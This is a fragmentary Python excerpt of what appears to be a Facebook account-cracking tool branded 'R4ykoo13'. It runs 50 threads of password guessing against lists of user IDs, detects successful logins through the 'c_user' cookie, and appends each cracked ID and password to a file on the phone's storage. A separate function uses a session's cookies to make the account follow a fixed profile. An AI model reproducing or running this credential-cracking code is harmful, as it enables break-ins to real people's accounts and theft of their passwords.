...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100070789752654', {
...
def o():
   ...
   # print(f'{B} [{R}2{B}]{P} 8 DIGIT')
    print(f'{B} [{R}1{B}]{P}Welcome To Tool  R4ykoo13')
    code = input(f'\n{R} [{B}+{R}] {P}Bnusa 750 : ')
    print("")
    ...
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;92m HAMU IDS : '+tl)
        print('')
        print('\033[1;31m Bosta Ta 20 Daqa Crack Dakam\033[1;97m')
        print(60*'=')
        print('')
        for love in user:
            pwx = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f"\x1b[38;5;196m[TANYA-CP] {cid} | {ps}")
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/TANYA-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[R4ykoo13] [%s/%s]  \033[1;92mOK\033[1;97m|  \r'%(loop,tl,len(oks))),
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f"\x1b[38;5;196m[R4ykoo13-CP😵] {cid} | {ps}")
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/TANYA-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
